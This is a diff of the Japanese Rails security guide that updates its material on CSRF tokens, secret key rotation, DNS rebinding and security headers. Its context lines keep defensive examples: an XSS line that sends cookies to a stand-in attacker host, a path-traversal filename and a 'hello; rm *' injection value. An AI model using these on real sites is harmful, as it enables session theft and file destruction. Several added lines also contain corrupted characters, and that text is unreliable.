@@ -97,7 +97,11 @@ test環境とdevelopment環境のアプリケーションでは、アプリケ�
 secret_key_base: 492f...
 ```
 
-WARNING: 万一アプリケーションの秘密鍵が漏洩した場合は、秘密鍵の変更をぜひともご検討ください。ただし、`secret_key_base`を変更すると、現在アクティブなセッションが一斉に失効します（訳注: ユーザー数の多いサイトで多数のアクティブなセッションを急に失効させると、一時的にセッションが大量に再作成されて負荷が急増し、サーバーがダウンするなどの問題につながる可能性も考えられます）。
+WARNING: 万一アプリケーションの秘密鍵が漏洩した場合は、秘密鍵の変更をぜひともご検討ください。ただし、`secret_key_base`を変更すると、現在有効なセッションが失効し、すべてのユーザーが再ログインしなければならなくなることにご注意ください。セッションデータに加えて、以下も影響を受ける可能性があります。
+
+* 暗号化済みcookies
+* 署名済みcookies
+* Active Storageファイル
 
 ### 暗号化cookieや署名済みcookieの設定をローテーションする
 
@@ -133,7 +137,7 @@ TIP: **`CookieStore`を扱うのであれば、もう一つの攻撃方法であ
 
 リプレイ攻撃のしくみは次のとおりです。
 
-* ユーザーがクレジットを受け取り、総額はセッションに保存されているとする（これはあくまで説明のためのものであり、実際にやってはいけません）。
+* ユーザーがクレジットを受け取り、総額はセッションに���存されているとする（これはあくまで説明のためのものであり、実際にやってはいけません）。
 * ユーザーがクレジットで何かを購入する。
 * 使った分減ったクレジットがセッションに保存される。
 * ユーザーは、最初にブラウザに保存されていたcookieのコピーを現在のブラウザのcookieと差し替える。
@@ -215,6 +219,8 @@ CSRFは、[CVE（Common Vulnerabilities and Exposures）](https://cve.mitre.org/
 
 NOTE: **第1に、W3Cが要求しているとおり、GETとPOSTを適切に使うことです。第2に、GET以外のリクエストにセキュリティトークンを追加することで、WebアプリケーションがCSRFから保護されます。**
 
+#### GETとPOSTは適切に使い分けること
+
 HTTPプロトコルは2つの基本的なリクエストであるGETとPOSTを提供しています （DELETE、PUT、PATCHはPOSTと同様に使うべきです）。World Wide Web Consortium（W3C）は、HTTPのGETやPOSTを選択する際のチェックリストを提供しています。
 
 **以下の場合はGETを使うこと**
@@ -252,6 +258,8 @@ WebアプリケーションがRESTfulであれば、PATCH、PUT、DELETEなど�
 
 NOTE: `<script>`タグのoriginが同じサイトか悪意のあるサイトかは、区別しようがありません。このため`<script>`タグは、たとえ実際には自サイトの「同一オリジン」スクリプトであっても、全面的にブロックしなければなりません。このような場合、`<script>`を対象にJavaScriptを使う操作では明示的にCSRF保護をスキップします。
 
+#### 必須セキュリティトークン
+
 この種の偽造リクエストをすべて防止するには、**必須セキュリティトークン**を導入します。このトークンは自分のサイトだけが知っており、他のサイトは知りません。リクエストにはこのセキュリティトークンを含め、サーバー側でこれを検証します。これは、[`config.action_controller.default_protect_from_forgery`][] を`true`に設定すると自動的に行われるようになります。以下の1行コードはアプリケーションのコントローラに追加するものであり、Railsで新規作成したアプリケーションにはこのコードがデフォルトで含まれます。
 
 ```ruby
@@ -260,7 +268,33 @@ protect_from_forgery with: :exception
 
 このコードがあると、Railsで生成されるすべてのフォームとAjaxリクエストにセキュリティトークンが自動的に含まれます。セキュリティトークンがマッチしない場合には例外がスローされます。
 
-NOTE: Railsにデフォルトで含まれる[unobtrusive scripting adapter](https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts)が追加する`X-CSRF-Token`ヘッダーは、GET以外のあらゆるAjax呼び出しでセキュリティトークンを含みます。このヘッダーがないと、RailsはGET以外のAjaxリクエストを受け付けなくなります。Ajax呼び出しに他のライブラリを使う場合は、そのライブラリのAjax呼び出しのデフォルトのヘッダーにセキュリティトークンを追加する必要があります。このトークンは、アプリケーションのビューで`<%= csrf_meta_tags %>`から出力される`<meta name='csrf-token' content='THE-TOKEN'>`タグで見ることができます。
+[Turbo](https://turbo.hotwired.dev/)を使ってフォームを送信する場合も、セキュリティトークンが必要です。Turboはアプリケーションレイアウトの`csrf`メタタグでトークンを探索し、`X-CSRF-Token`リクエストヘッダでリクエストに追加します。これらのメタタグは、以下の[`csrf_meta_tags`][]ヘルパーメソッドで作成されます。
+
+
+```erb
+<head>
+  <%= csrf_meta_tags %>
+</head>
+```
+
+上のコードによって以下が生成されます。
+
+```html
+<head>
+  <meta name="csrf-param" content="authenticity_token" />
+  <meta name="csrf-token" content="（トークン）" />
+</head>
+```
+
+JavaScriptから独自の非GETリクエストを行う場合も、セキュリティトークンが必要です。Railsのリポジトリにある[Request.JS](https://github.com/rails/request.js)は、必要なリクエストヘッダを追加するロジックをカプセル化したJavaScriptライブラリです。
+
+その他のライブラリを利用してAjax呼び出しを行う場合、自分でセキュリティトークンをデフォルトヘッダーとして追加する必要があります。`meta`タグからセキュリティトークンを取得するには、以下のようにします。
+
+```javascript
+document.head.querySelector("meta[name=csrf-token]")?.content
+```
+
+#### 永続化cookieをクリアする
 
 ユーザー情報を永続化cookie（`cookies.permanent`など）に保存することはよく行われています。この場合、cookieは消去されないことと、前述の保護機構の外ではCSRFからの保護を受けられなくなる点に注意が必要です。何らかの理由でこのような情報をセッション以外のcookieストアに保存する場合は、必要な操作を開発者自身が行わなければなりません。
 
@@ -275,6 +309,7 @@ end
 ただし、**クロスサイトスクリプティング（XSS）脆弱性があると、あらゆるCSRF保護が迂回されてしまいます**。XSS脆弱性が存在すると、攻撃者がWebページのあらゆる要素にアクセス可能になるので、フォームからCSRFセキュリティトークンを読みだしてそのフォームを直接送信できてしまいます。後述の[XSSの詳細](security.html#クロスサイトスクリプティング（xss）)もお読みください。
 
 [`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
+[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
 
 リダイレクトとファイル
 ---------------------
@@ -289,7 +324,7 @@ WARNING: **Webアプリケーションにおけるリダイレクトは、過小
 
 ```ruby
 def legacy
-  redirect_to(params.update(action:'main'))
+  redirect_to(params.update(action: 'main'))
 end
 ```
 
@@ -315,17 +350,17 @@ NOTE: **ファイルがアップロードされたときに重要なファイル
 
 多くのWebアプリケーションでは、ユーザーによるファイルアップロードを許可しています。**ユーザーが選択・入力できるファイル名（またはその一部）は必ずフィルタしてください。**攻撃者が危険なファイル名をわざと使ってサーバーのファイルを上書きしようとする可能性があるためです。ファイルが /var/www/uploads ディレクトリにアップロードされ、そのときにファイル名が「../../../etc/passwd」と入力されていると、重要なファイルが上書きされてしまう可能性があります。言うまでもなく、Rubyインタプリタにそれだけの実行権限が与えられていなければ、そのような上書きは実行できません。Webサーバー、データベースサーバーなどのプログラムは、比較的権限の小さいUnixユーザーとして実行されるのが普通です。
 
-もう１つ注意があります。ユーザーが入力したファイル名をフィルタするときには、**ファイル名から危険な部分を取り除く「禁止リスト」的アプローチを使ってはいけません**。Webアプリケーションがファイル名から「../」という文字を取り除くことに成功しても、今度は攻撃者が「....//」のようなその裏をかくパターンを使えば「../」という相対パスが通ってしまうというふうに、禁止リスト的な手法ではどうしても漏れが残ってしまいます。最も良い方法は「許可リスト」によるアプローチです。これは **ファイル名が有効であるかどうか（指定された文字だけが使われているかどうか）をチェックするものです**（これは、利用が許されてない文字を除去する「禁止リスト」と逆のアプローチです）。ファイル名が無効な場合は、拒否するか、無効な文字を（削除ではなく）置き換えるかのどちらかにします。以下の例は、[attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master)プラグインから抜粋したファイル名サニタイザです。
+もう1つ注意があります。ユーザーが入力したファイル名をフィルタするときには、**ファイル名から危険な部分を取り除く「禁止リスト」的アプローチを使ってはいけません**。Webアプリケーションがファイル名から「../」という文字を取り除くことに成功しても、今度は攻撃者が「....//」のようなその裏をかくパターンを使えば「../」という相対パスが通ってしまうというふうに、禁止リスト的な手法ではどうしても漏れが残ってしまいます。最も良い方法は「許可リスト」によるアプローチです。これは **ファイル名が有効であるかどうか（指定された文字だけが使われているかどうか）をチェックするものです**（これは、利用が許されてない文字を除去する「禁止リスト」と逆のアプローチです）。ファイル名が無効な場合は、拒否するか、無効な文字を（削除ではなく）置き換えるかのどちらかにします。以下の例は、[attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master)プラグインから抜粋したファイル名サニタイザです。
 
 ```ruby
 def sanitize_filename(filename)
   filename.strip.tap do |name|
     # メモ: File.basenameは、Unix上でのWindowsパスに対しては正常に動作しません
     # フルパスではなくファイル名のみを取得
-    name.sub! /\A.*(\\|\/)/, ''
+    name.sub!(/\A.*(\\|\/)/, '')
     # 最終的に非英数文字をアンダースコアまたは
-    # ピリオドとアンダースコアに置き換え
-    name.gsub! /[^\w\.\-]/, '_'
+    # ピリオドとアンダースコアに置き換える
+    name.gsub!(/[^\w.-]/, '_')
   end
 end
 ```
@@ -362,39 +397,6 @@ send_file filename, disposition: 'inline'
 ```
 
 別の方法は、ファイル名をデータベースに保存しておき、データベースのidをサーバーのディスク上に置く実際のファイル名の代わりに使うことです（これは上の方法と併用可能です）。この方法も、アップロードファイルが実行される可能性を回避する方法として優れています。`attachment_fu`プラグインでも同様の手法が採用されています。
-
-イントラネットとAdminのセキュリティ
----------------------------
-
-イントラネットや管理画面インターフェイスは特権アクセスが許可されているので、攻撃の目標にされがちです。イントラネットや管理画面インターフェイスにはセキュリティ対策の追加が必要なはずですが、現実には逆にセキュリティ対策が弱いことがしばしばあります。
-
-2007年、その名もMonster.comというオンラインリクルート用Webアプリケーションで、特殊なトロイの木馬プログラムによってイントラネットから情報が盗み出され、文字どおり経営者にとってのモンスターとなった事件がありました。標的を絞り込んだオーダーメイドのトロイの木馬は現時点では非常にまれなので、リスクは相当低いと言えますが、それでもゼロではありません。これは、クライアントホストのセキュリティも重要であるというよい例です。ただし、イントラネットや管理アプリケーションにとって最も脅威となるのは、XSSとCSRFです。
-
-**XSS:** 悪意のあるユーザーがイントラネットの外から入力したデータがWebアプリケーションで再表示されると、WebアプリケーションがXSS攻撃に対して脆弱になります。ユーザー名、コメント、スパムレポート、注文フォームの住所のような情報がXSS攻撃に使われることも珍しくありません。
-
-管理画面やイントラネットで1箇所でもサニタイズ漏れがあれば、アプリケーション全体が脆弱になってしまいます。想定される攻撃としては、管理者のcookieの盗み出し、管理者パスワードを盗み出すためのiframe注入、管理者権限奪取のためにブラウザのセキュリティホールを経由して悪質なソフトウェアをインストールする、などが考えられます。
-
-XSS対策の注入に関するセクションも参照してください。
-
-**CSRF:** クロスサイトリクエストフォージェリ（Cross-Site Request Forgery）はクロスサイトリファレンスフォージェリ（XSRF: Cross-Site Reference Forgery）とも呼ばれ、非常に強力な攻撃手法です。この攻撃を受けると、管理者やイントラネットユーザーが実行可能な操作をすべて行えるようになってしまいます。CSRFについては既に説明しましたので、ここでは攻撃者がイントラネットや管理画面に対して攻撃を仕掛ける手順をいくつかの事例で説明します。
-
-現実に起きた事例として[CSRFによるルーター再構成](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352) を取り上げましょう。この攻撃者は、CSRFを仕込んだ危険なメールをメキシコの多数のユーザーに送信しました。このメールには、「お客様のeカードをご用意いたしました」と書かれており、imageタグが含まれていました。そしてそのタグには、ユーザーのルーターを再構成してしまうHTTP GETリクエストが仕込まれていました。このルーターは、メキシコで広く普及しているモデルでした。このリクエストによってDNS設定が変更され、メキシコで事業を行っているネットバンキングWebサイトの一部が、攻撃者のWebサイトにマッピングされてしまいました。このルーターを経由してこのネットバンキングサイトにアクセスすると、攻撃者が設置した偽のWebサイトが開き、認証情報が盗まれてしまいました。
-
-Google Adsenseのメールアドレスとパスワードが変更された事例もあります。標的ユーザーがGoogle AdsenseにログインしてGoogle広告キャンペーン用の管理画面を開くと、攻撃者が標的ユーザーの認証情報を改変可能になるというものでした。
-
-その他の有名な事例としては、危険なXSSを拡散するために一般のWebアプリケーションやブログ、掲示板が利用された事件があります。言うまでもなく、この攻撃を成功させるためには攻撃者がURL構造を知っている必要がありますが、RailsのURLは構造がかなりシンプルなので、オープンソースの管理画面を使えば構造を簡単に調べられます。攻撃者は、ありそうなIDとパスワードの組み合わせを総当りで試す危険な`Img`タグを送り込むだけで、数千件ものまぐれ当たりを獲得できる可能性があります。
-
-**管理画面やイントラネットへのCSRF攻撃への対策については、CSRF対策のセクションを参照してください**。
-
-### その他の予防策
-
-管理画面は、多くの場合次のような作りになっているものです。www.example.com/admin のようなURLに置かれ、Userモデルのadminフラグがセットされている場合に限り、ここにアクセスできます。ユーザー入力が管理画面のフィールドに再表示されると、管理者の権限で任意のデータを削除・追加・編集できてしまいます。これについて考察してみましょう。
-
-* **常に最悪の事態を想定する**ことは極めて重要です。「誰かが自分のcookieやユーザー情報を盗み出すことに成功したらどうなるか」。管理画面に**ロール（role）**を導入することで、攻撃者が行える操作の範囲を狭めることができます。あるいは、アプリケーションで公開される部分で使われるログイン情報から切り離された、管理画面用の特殊なログイン認証情報を使う方法や、**極めて重要な操作では別途特殊なパスワードを要求する**方法も考えられます。
-
-* 管理者は、世界中どこからでもそのWebアプリケーションにアクセスする必要性があるとは限りません。**送信元IPアドレスを一定の範囲に制限する**という方法を考えてみましょう。`request.remote_ip`メソッドを使えばユーザーのIPアドレスをチェックできます。この方法は攻撃に対する直接の防御にはなりませんが、攻撃を困難にするうえでは非常に有効です。ただし、プロキシを用いて送信元IPアドレスを偽る方法があることもお忘れなく。
-
-* **管理画面を特別なサブドメインに置く**方法 （`admin.application.com`など）。さらに管理アプリケーションを独立させて独自のユーザー管理を行えるようにします。このような構成にすることで、通常の`www.application.com`ドメインから管理者cookieを盗み出すことは不可能になります。ブラウザには同一オリジンポリシーがあるので、`www.application.com`に注入されたXSSスクリプトから`admin.application.com`のcookieを読み出すことも、その逆も不可能になります。
 
 ユーザー管理
 ---------------
@@ -439,7 +441,7 @@ CAPTCHAのAPIとしては[reCAPTCHA](https://developers.google.com/recaptcha/)�
 
 このAPIでは公開鍵と秘密鍵という2つの鍵を受け取ります。これらの鍵はRailsの環境に置く必要があります。それにより、ビューで`recaptcha_tags`メソッドを、コントローラでは`verify_recaptcha`メソッドをそれぞれ利用できます。バリデーションに失敗すると`verify_recaptcha`からfalseが返されます。
 
-CAPTCHAの問題は、使い勝手が多少落ちることです。さらに、弱視など視力に問題のあるユーザーはCAPTCHAの歪んだ画像をうまく読めないこともあります。なおポジティブCAPTCHAは、ボットによるあらゆるフォーム自動送信を防ぐ優れた方法の１つです。
+CAPTCHAの問題は、使い勝手が多少落ちることです。さらに、弱視など視力に問題のあるユーザーはCAPTCHAの歪んだ画像をうまく読めないこともあります。なおポジティブCAPTCHAは、ボットによるあらゆるフォーム自動送信を防ぐ優れた方法の1つです。
 
 ほとんどのボットは、単にWebページをクロールしてフォームを見つけてはスパム文を自動入力するだけのお粗末なものです。ネガティブCAPTCHAはこれを逆手に取り、フォームに「ハニーポット」フィールドを置いておきます。これは、CSSやJavaScriptを用いて人間には表示されないように設定されたダミーのフィールドです。
 
@@ -482,7 +484,7 @@ INFO: **Rubyの正規表現でよくある落とし穴は、より安全な`\A`�
 Rubyの正規表現では、文字列の冒頭や末尾にマッチさせる方法が他の言語と若干異なります。このため、多くのRuby本やRails本でもこの点について間違った記載があります。どのようなセキュリティ問題が生じるのでしょうか。たとえば、URLフィールドの入力が有効かどうかを検証するのに、以下のような単純な正規表現を使ったとします。
 
 ```ruby
-  /^https?:\/\/[^\n]+$/i
+/^https?:\/\/[^\n]+$/i
 ```
 
 これは一部の言語では正常に動作しますが、**Rubyの`^`や`$`は、入力全体の冒頭と末尾ではなく「行の」冒頭と末尾にマッチしてしまいます**。従って、以下のように改行を含む毒入りURLはフィルタを通過してしまいます。
@@ -496,7 +498,7 @@ http://hi.com
 上のURLをフィルタで検出できない理由は、入力の2行目にマッチしてしまうからです。つまり、1行目と3行目にどんな文字列があってもフィルタを通過してしまいます。フィルタをすり抜けてしまったURLが、ビューの以下の箇所で表示されたとします。
 
 ```ruby
-  link_to "Homepage", @user.homepage
+link_to "Homepage", @user.homepage
 ```
 
 表示されるリンクは一見無害に見えますが、クリックすると、攻撃者が送り込んだ悪質な`exploit_code()`関数を初めとする任意のJavaScriptコードが実行されてしまいます。
@@ -504,14 +506,14 @@ http://hi.com
 これらの正規表現に含まれる危険な`^`や`$`は、以下のように安全な`\A`や`\z`に置き換える必要があります。
 
 ```ruby
-  /\Ahttps?:\/\/[^\n]+\z/i
+/\Ahttps?:\/\/[^\n]+\z/i
 ```
 
 `^`や`$`をうっかり使ってしまうミスが頻発したため、Railsのフォーマットバリデータ（`validates_format_of`）では、正規表現の冒頭の`^`や末尾の`$`に対して例外を発生するようになりました。めったにないと思われますが、どうしても`\A`や`\z`ではなく`^`や`$`を使いたい場合は、以下のように`:multiline`オプションをtrueに設定することも可能です。
 
 ```ruby
-  # この文字列のどの行にも"Meanwhile"という文字が含まれている必要がある
-  validates :content, format: { with: /^Meanwhile$/, multiline: true }
+# この文字列のどの行にも"Meanwhile"という文字が含まれている必要がある
+validates :content, format: { with: /^Meanwhile$/, multiline: true }
 ```
 
 この機能は、フォーマットバリデータ利用時に起きがちなミスから保護するだけのものであり、それ以上のものではない点にご注意ください。`^`や`$`はRubyでは **1つの行** に対してマッチし、文字列全体にはマッチしないということを開発者が十分理解しておくことが重要です。
@@ -534,7 +536,7 @@ Webアプリケーションによってはこのコードで問題がないこ�
 
 Webアプリケーションによっては、ユーザーが改ざん可能なパラメータが他にも潜んでいる可能性があります。要するに、**ユーザー入力は安全確認が終わるまでは安全ではなく、ユーザーから送信されるいかなるパラメータであっても、何らかの操作が加えられている可能性が常にある**ということです。
 
-難読化やJavaScriptのセキュリティは安心材料になりません。ブラウザのWeb Developer Toolbarを使えば、フォームの隠しフィールドを見つけて変更できます。**JavaScriptでユーザーの入力データを検証することは可能ですが、攻撃者が想定外の値を入力して悪質なリクエストを送信することは阻止しようがありません**。Mozilla Firefox用のFirebugアドオンを使えば、すべてのリクエストをログに記録して、同じリクエストを繰り返し送信することも、リクエストを改変することも可能です。さらに、JavaScriptのバリデーションはブラウザのJavaScriptをオフにするだけで簡単にバイパスできてしまいます。さらに、クライアントやインターネットのあらゆるリクエストやレスポンスを密かに傍受するプロキシがクライアント側に潜んでいる可能性すらあります。
+難読化やJavaScriptのセキュリティは安心材料になりません。ブラウザのWeb Developer Toolbar（DevTools）を使えば、フォームの隠しフィールドを見つけて変更できます。**JavaScriptでユーザーの入力データをバリデーションすることは可能ですが、攻撃者が想定外の値を入力して悪質なリクエストを送信することは阻止しようがありません**。DevToolsはすべてのリクエストを記録し、まったく同じリクエストを繰り返し送信することも、リクエストを改変することも可能です。また、JavaScriptのバリデーションは簡単にバイパスできてしまいます。さらに、クライアントやインターネットのあらゆるリクエストやレスポンスを密かに傍受するプロキシがクライアント側に潜んでいる可能性すらあります。
 
 インジェクション
 ---------
@@ -686,7 +688,7 @@ XSSのしくみを確かめる最も簡単なテストをご紹介します。
 <script>document.write(document.cookie);</script>
 ```
 
-もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookieを表示したところで何の意味もありません。次の例では`http://www.attacker.com/`というURLから画像とcookieを読み込みます。言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません（訳注: 現在は売り物件のWebページがあるようです）。ただし攻撃者が自分たちのWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照する可能性もあります。
+もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookie���表示したところで何の意味もありません。次の例では`http://www.attacker.com/`というURLから画像とcookieを読み込みます。言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません（訳注: 現在は売り物件のWebページがあるようです）。ただし攻撃者が自分たちのWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照する可能性もあります。
 
 ```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
@@ -740,7 +742,7 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 この方法なら指定されたタグのみが許可されるため、あらゆる攻撃方法や悪質なタグに対してフィルタが正常に機能します。
 
-第2段階として、**Webアプリケーションからの出力を１つ残らずエスケープする**ことが優れた対策となります。これは特に、ユーザー入力の段階でフィルタされなかった文字列がWeb画面に再表示された場合に有効です。**`html_escape()`（または別名の`h()`）メソッド**を用いて、HTML入力文字（`&`、`"`、`<`、`>`）を無害なHTML表現形式（`&amp;`、`&quot;`、`&lt;`、`&gt;`）に置き換えます。
+第2段階として、**Webアプリケーションからの出力を1つ残らずエスケープする**ことが優れた対策となります。これは特に、ユーザー入力の段階でフィルタされなかった文字列がWeb画面に再表示された場合に有効です。**`html_escape()`（または別名の`h()`）メソッド**を用いて、HTML入力文字（`&`、`"`、`<`、`>`）を無害なHTML表現形式（`&amp;`、`&quot;`、`&lt;`、`&gt;`）に置き換えます。
 
 ##### 攻撃の難読化とエンコーディングインジェクション
 
@@ -861,7 +863,7 @@ system("/bin/echo #{user_input}")
 対策は、**コマンドラインのパラメータを安全に渡せる`system(コマンド名, パラメータ)`メソッドを使うことです**。
 
 ```ruby
-system("/bin/echo","hello; rm *")
+system("/bin/echo", "hello; rm *")
 # "hello; rm *"を実行してもファイルは削除されない
 ```
 
@@ -924,6 +926,27 @@ Location: http://www.malicious.tld
 
 **ヘッダーインジェクションにおける攻撃経路は、ヘッダーへのCRLF文字インジェクションに基づいています**。攻撃者は偽のリダイレクトでどんなことができてしまうのでしょうか。攻撃者は、ユーザーをフィッシングサイトにリダイレクトし（フィッシングサイトは本物そっくりに作っておきます）、そこでユーザーを再度ログインさせてそのログイン情報を攻撃者が受け取る可能性があります。あるいは、フィッシングサイトからブラウザのセキュリティホールを経由して悪質なソフトウェアを注入する可能性もあります。Rails 2.1.2では、`redirect_to`メソッドの`Location`フィールドからこれらの文字をエスケープするようになりました。**ユーザー入力を用いて通常以外のヘッダーフィールドを作成する場合には、CRLFのエスケープを必ず自分で実装してください**。
 
+#### DNSリバインディングとHostヘッダー攻撃
+
+DNSリバインディング（DNS rebinding）は、ドメイン名の解決を操作する方法で、コンピュータ攻撃の一種としてよく利用されます。DNSリバインディングは、Domain Name System（DNS）を悪用することで、同一生成元ポリシー（same-origin policy）を回避します。ドメインを別のIPアドレスにリバインドし、変更後のIPアドレスからRailsアプリに対して悪意のあるコードを実行することでシステムを侵害します。
+
+DNSリバインディングやその他のHostヘッダー攻撃から防衛するために、`ActionDispatch::HostAuthorization`ミドルウェアの利用が推奨されています。development環境ではデフォルトで有効になっていますが、production環境やその他の環境では、許可するホストのリストを設定することで有効にする必要があります。また、例外の設定や独自のレスポンスアプリを設定することも可能です。
+
+```ruby
+Rails.application.config.hosts << "product.com"
+
+Rails.application.config.host_authorization = {
+  # ホストチェックから/healthcheck/パスへのリクエストを除外する
+  exclude: ->(request) { request.path.include?("healthcheck") },
+  # レスポンス用のカスタムRackアプリケーションを追加する
+  response_app: -> env do
+    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
+  end
+}
+```
+
+詳しくは、[`ActionDispatch::HostAuthorization`](/configuring.html#actiondispatch-hostauthorization)ミドルウェアのドキュメントを参照してください。
+
 #### レスポンス分割
 
 ヘッダーインジェクションが実行可能になっている場合、レスポンス分割（response splitting）攻撃も同様に実行可能になっている可能性があります。HTTPのヘッダーブロックの末尾には2つのCRLFが置かれてヘッダーブロックの終了を示し、その後ろに実際のデータ（通常はHTML）が置かれます。レスポンス分割とは、ヘッダーフィールドに2つのCRLFを注入し、以後の行に悪意のあるHTMLを配置するという手法です。このときのレスポンスは以下のようになります。
@@ -982,26 +1005,62 @@ config.action_dispatch.perform_deep_munge = false
 HTTPセキュリティヘッダー
 ---------------
 
-Railsアプリケーションから受け取るすべてのHTTPレスポンスには、以下のセキュリティヘッダーがデフォルトで含まれています。
+アプリケーションのセキュリティを強化するために、RailsでHTTPセキュリティヘッダーを返すように設定できます。デフォルトで設定済みのヘッダもあれば、明示的な設定が必要なヘッダーもあります。
+
+### デフォルトのセキュリティヘッダー
+
+デフォルトのRailsは、以下のレスポンスヘッダを返すように設定されています。アプリケーションは、あらゆるHTTPレスポンスに対してこれらのヘッダを返します。
+
+#### `X-Frame-Options`
+
+[`X-Frame-Options`][]ヘッダーは、ブラウザがページを `<frame>`、`<iframe>`、`<embed>`、または`<object>`タグでレンダリングしてよいかどうかを示します。
+このヘッダはデフォルトで`SAMEORIGIN`に設定されており、同一ドメイン内でのみフレームのレンダリングを許可します。
+フレームのレンダリングを完全に拒否する場合は`DENY`に設定します。
+すべてのドメインでフレームを許可したい場合は、このヘッダを完全に削除します。
+
+[`X-Frame-Options`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Frame-Options
+
+#### `X-XSS-Protection`
+
+[非推奨レガシーヘッダー](https://owasp.org/www-project-secure-headers/#x-xss-protection)は、Railsではデフォルトで`0`に設定されており、問題のあるレガシーXSS Auditorを無効化します。
+
+#### `X-Content-Type-Options`
+
+[`X-Content-Type-Options`][]ヘッダーは、Railsではデフォルトで`nosniff`に設定されています。
+この設定にすると、ブラウザがファイルのMIMEタイプを推測しなくなります。
+
+[`X-Content-Type-Options`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Content-Type-Options
+
+#### `X-Permitted-Cross-Domain-Policies`
+
+このヘッダーは、Railsではデフォルトで`none`に設定されています。この設定にすると、Adobe FlashやPDFクライアントが他のドメインに自分のページを埋め込むことを禁止します。
+
+#### `Referrer-Policy`
+
+[`Referrer-Policy`][]ヘッダーは、Railsではデフォルトで `strict-origin-when-cross-origin`に設定されています。
+クロスオリジンリクエストの場合、Refererヘッダーで送信されるのはoriginのみとなります。これにより、完全なURLの他の部分（パスやクエリ文字列など）からアクセスできる可能性のあるプライベートデータの漏えいを防止します。
+
+[`Referrer-Policy`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Referrer-Policy
+
+#### デフォルトのヘッダーを設定する
+
+これらのヘッダーは、デフォルトでは以下のように設定されます。
 
 ```ruby
 config.action_dispatch.default_headers = {
   'X-Frame-Options' => 'SAMEORIGIN',
   'X-XSS-Protection' => '0',
   'X-Content-Type-Options' => 'nosniff',
-  'X-Download-Options' => 'noopen',
   'X-Permitted-Cross-Domain-Policies' => 'none',
   'Referrer-Policy' => 'strict-origin-when-cross-origin'
 }
 ```
 
-デフォルトのヘッダー設定は`config/application.rb`で変更できます。
+これらのヘッダーを上書きしたりヘッダーを追加するには、`config/application.rb`で以下のように設定します。
 
 ```ruby
-config.action_dispatch.default_headers = {
-  'Header-Name' => 'Header-Value',
-  'X-Frame-Options' => 'DENY'
-}
+config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
+config.action_dispatch.default_headers['Header-Name']     = 'Value'
 ```
 
 以下のようにヘッダーを除去することもできます。
@@ -1010,18 +1069,21 @@ config.action_dispatch.default_headers = {
 config.action_dispatch.default_headers.clear
 ```
 
-よく使われるヘッダーのリストを以下に示します。
+### `Strict-Transport-Security`ヘッダー
 
-* **`X-Frame-Options`**: Railsではデフォルトで`SAMEORIGIN`が指定されます。このヘッダーは、同一ドメインでのフレームを許可します。'DENY'を指定するとすべてのフレームが不許可になります。すべてのWebサイトについてフレームを許可するにはこのヘッダーを除去します。
-* **`X-XSS-Protection`**: Railsではデフォルトで`0`が指定されます。これは[非推奨化されたレガシーヘッダー](https://owasp.org/www-project-secure-headers/#x-xss-protection)であり、問題のあるレガシーXSS監査を無効にするために`0`に設定してください。
-* **`X-Content-Type-Options`**: Railsではデフォルトで`nosniff`が指定されます。このヘッダーは、ブラウザによるファイルのMIMEタイプ推測を停止します。
-* **`X-Content-Security-Policy`**: このヘッダーは、[特定Content-Typeの読み込み元サイトを制御するための強力なメカニズム](https://w3c.github.io/webappsec-csp/)です。
-* **`Access-Control-Allow-Origin`**: このヘッダーは、同一オリジンポリシーのバイパスとクロスオリジン（cross-origin）リクエスト送信を許可するサイトを指定するのに使います。
-* `Strict-Transport-Security`: このヘッダーは、[セキュア接続によるサイトアクセスのみをブラウザに許可するかどうかを指定する](https://ja.wikipedia.org/wiki/HTTP_Strict_Transport_Security)のに使います。
+HTTP [`Strict-Transport-Security`][]（HTST）レスポンスヘッダーは、ブラウザが現在および将来の接続を自動的にHTTPSにアップグレードするようにします。
 
-### Content Security Policyヘッダー
+このヘッダーは、以下のように`force_ssl`オプションを有効にするとレスポンスに追加されます。
 
-XSSやインジェクションによる攻撃を防ぐために、アプリケーションのレスポンスヘッダーに[Content Security Policy](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy)（CSP）を設定することが推奨されています。Railsでは、このヘッダーを設定するためのDSLが提供されています。
+```ruby
+config.force_ssl = true
+```
+
+[`Strict-Transport-Security`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Strict-Transport-Security
+
+### `Content-Security-Policy`ヘッダー
+
+XSSやインジェクションによる攻撃を防ぐために、アプリケーションのレスポンスヘッダーに[`Content-Security-Policy`][]（CSP）を定義することが推奨されています。Railsでは、このヘッダーを設���するためのDSLが提供されています。
 
 このセキュリティポリシーを適切なイニシャライザで定義します。
 
@@ -1069,9 +1131,11 @@ class PostsController < ApplicationController
 end
 ```
 
+[Content Security Policy]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy
+
 #### 違反をレポートする
 
-指定されたURIに対する違反を報告する[`report-uri`](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri)ディレクティブを有効にします。
+指定されたURIに対する違反を報告する[`report-uri`][]ディレクティブを有効にします。
 
 ```ruby
 Rails.application.config.content_security_policy do |policy|
@@ -1079,14 +1143,14 @@ Rails.application.config.content_security_policy do |policy|
 end
 ```
 
